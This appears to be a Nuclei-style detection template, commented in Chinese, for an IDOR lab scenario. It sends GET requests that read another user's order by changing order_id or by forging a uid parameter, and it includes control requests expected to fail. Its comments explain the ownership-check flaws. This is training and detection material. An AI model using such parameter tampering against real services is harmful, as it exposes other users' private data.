@@ -1,0 +1,187 @@
+id: vulnlab-idor-broken-access-control
+
+info:
+  name: 越权（水平越权 / IDOR）
+  severity: high
+  author: hediwen
+  tags: [idor, broken-access-control, authorization, horizontal-privilege-escalation]
+
+  description: |
+    订单详情接口没有正确校验「这个订单是不是你的」，导致能读到其他用户的数据。
+
+    本 PoC 覆盖两种失效方式：
+
+      ① **完全没有归属校验** —— 只按订单号查，不问是谁在查
+      ② **归属校验的依据来自请求参数** ——
+         校验代码本身完全正确（`WHERE id = ? AND user_id = ?`），
+         但第二个问号填的是请求里的 `uid`。
+         校验**没有被绕过，它通过了** —— 它只是被喂了个假身份。
+
+    ⚠️ 本检测是**只读**的 —— 只查询一条订单、只读取「刚好够证明问题」的记录，
+    不批量遍历、不下载更多数据、不做任何写操作。
+
+    真实授权测试中，越权验证应当遵守最小化原则：
+      · 只取一条能证明问题的记录，不要遍历 ID 段
+      · 涉及真实用户数据时，报告里不要原文粘贴，只写「可读取 X 类字段」
+      · 立即在报告里说明访问了哪条记录，便于目标方核对
+
+    ── 判据为什么是「凭证是否出现」而不是「响应里有 alice」──
+
+    靶场页面上的说明文字里就有 `alice`（例如「当前登录用户是 alice」），
+    如果按关键词匹配，会无条件命中。
+
+    所以判据用「别人的订单里的那个凭证是否出现」——
+    它只在**成功读到不属于自己的订单**时才渲染。
+    这和前面几个场景的判据思路一致：
+    **判据要指向「这次越权成功了」，而不是「页面上有某个词」。**
+
+    ── 这一条为什么用「已知真实 ID」做载荷 ──
+
+    high 档用了不可枚举的订单号（`ord_...`）而不是 `1003`。
+    很多实现会把这当成「修好了」—— 这是本场景最想指出的一类误解。
+
+    所以第 ③ 条载荷**直接使用 bob 订单的真实不可枚举 ID**。
+    如果防护只是「让 ID 猜不到」，这一条就会命中。
+    它不命中，说明防护确实是**归属校验**而不是**靠猜不到**。
+
+    这个区别在真实场景里是决定性的：
+    ID 会从分享链接、浏览器历史、日志、Referer、接口响应、邮件里泄露 ——
+    **一旦泄露，不可枚举就退化成普通 ID，而归属校验不会。**
+
+  reference:
+    - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
+
+requests:
+  # ── ① low 档：完全没有归属校验 ──────────────────────────────────
+  #
+  # 当前登录用户是 alice（uid=2），订单 1003 属于 bob（uid=3）。
+  # 服务端的查询短了一个条件：
+  #
+  #     low  : SELECT * FROM orders WHERE id = ?
+  #     high : SELECT * FROM orders WHERE id = ? AND user_id = :session_uid
+  #
+  # 差别就是**一个 WHERE 条件**。而这一条之差，
+  # 就是「功能正常」和「能读所有人的订单」之间的距离。
+  #
+  # 注意：这行代码本身没有任何「错误」—— 按 ID 查一条记录是完全正常的写法。
+  # 缺的是那个**业务上必须存在**的约束。
+  - method: GET
+    path:
+      - "{{BaseURL}}/idor/low.php?order_id=1003"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 别人的订单里的凭证 —— 只在成功越权时才渲染
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{idor_horizontal_escalation}"
+
+    extractors:
+      - type: regex
+        part: body
+        name: leaked_owner
+        regex:
+          - "下单用户</b><span class=\"mono\">([^<]*)</span>"
+
+  # ── ② medium 档：归属校验的依据来自请求参数 ─────────────────────
+  #
+  # 该档加了归属条件，SQL 完全正确：
+  #
+  #     SELECT * FROM orders WHERE id = ? AND user_id = ?
+  #                                                ↑ 这个值从哪来？
+  #
+  #     $uid = (int) $_REQUEST['uid'];   ← 从请求里读「我是谁」
+  #
+  # 于是把 uid 改成 3，就变成了 bob ——
+  # 归属校验**正常工作了**，它只是被喂了一个假的身份。
+  #
+  # 这个漏洞的形状和前九个场景都不一样：
+  # 前九个都是「某个检查被绕过了」，这一档是**检查通过了，
+  # 但依据的信息是攻击者给的**。
+  #
+  # 一句话：
+  # **校验的正确性，取决于它所依据的那个信息的可信度。**
+  - method: GET
+    path:
+      - "{{BaseURL}}/idor/medium.php?order_id=1003&uid=3"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{idor_horizontal_escalation}"
+
+    extractors:
+      - type: regex
+        part: body
+        name: bypass_variant
+        regex:
+          - "user_id = ([0-9]+)"
+
+  # ── ③ medium 档对照组：不带 uid 应被拦下 ────────────────────────
+  #
+  # 这一条**不应该命中**。它的作用是把「通过」归因给 uid 那个参数：
+  # 证明该档的归属校验确实在工作，不是「什么都不管」。
+  - method: GET
+    path:
+      - "{{BaseURL}}/idor/medium.php?order_id=1003"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{idor_horizontal_escalation}"
+
+  # ── ④ high 档：已知真实 ID 也不该读到（预期不命中）──────────────
+  #
+  # 这条载荷用的是 bob 订单的**真实不可枚举 ID**。
+  #
+  # 它验证的是本场景最重要的一点：
+  # **防护必须是归属校验，不能是「靠 ID 猜不到」。**
+  #
+  # 如果这一条命中了，说明 high 档只是把 ID 换成了随机串，
+  # 而没有真正做权限判断 —— 那种「修复」在 ID 泄露之后会立刻失效。
+  - method: GET
+    path:
+      - "{{BaseURL}}/idor/high.php?order_id=ord_b5c1e93d74"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{idor_horizontal_escalation}"
+
+  # ── ⑤ high 档：带伪造 uid 也应被忽略（预期不命中）───────────────
+  #
+  # medium 的绕过手法在 high 档必须失效 ——
+  # 身份只从服务端取，请求里带的 uid 会被直接忽略。
+  - method: GET
+    path:
+      - "{{BaseURL}}/idor/high.php?order_id=ord_b5c1e93d74&uid=3"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{idor_horizontal_escalation}"
